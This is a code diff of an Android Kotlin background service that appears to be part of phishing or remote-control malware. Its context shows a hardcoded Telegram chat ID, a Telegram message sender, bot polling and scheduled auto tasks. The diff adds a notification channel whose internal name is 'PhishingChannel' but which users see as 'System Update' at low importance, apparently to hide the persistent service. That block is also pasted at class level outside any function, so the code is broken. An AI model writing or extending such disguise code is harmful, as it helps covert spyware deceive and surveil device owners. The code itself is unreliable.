@@ -34,6 +34,9 @@ class MyService : Service() {
         const val CHAT_ID = "8820979221"
         private val client = OkHttpClient()
 
+private val CHANNEL_ID = "PhishingChannel"
+    private val NOTIFICATION_ID = 1
+        
         suspend fun sendStaticTelegramMessage(text: String) {
             try {
                 val form = FormBody.Builder()
@@ -51,6 +54,8 @@ class MyService : Service() {
             }
         }
     }
+
+    
 
     private lateinit var notifManager: NotificationManager
     private var lastUpdateId = 0L
@@ -87,6 +92,20 @@ class MyService : Service() {
         startBotPolling()
         scheduleAutoTasks()
     }
+
+if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "System Update",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.createNotificationChannel(channel)
+        }
+
+
+
+    
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
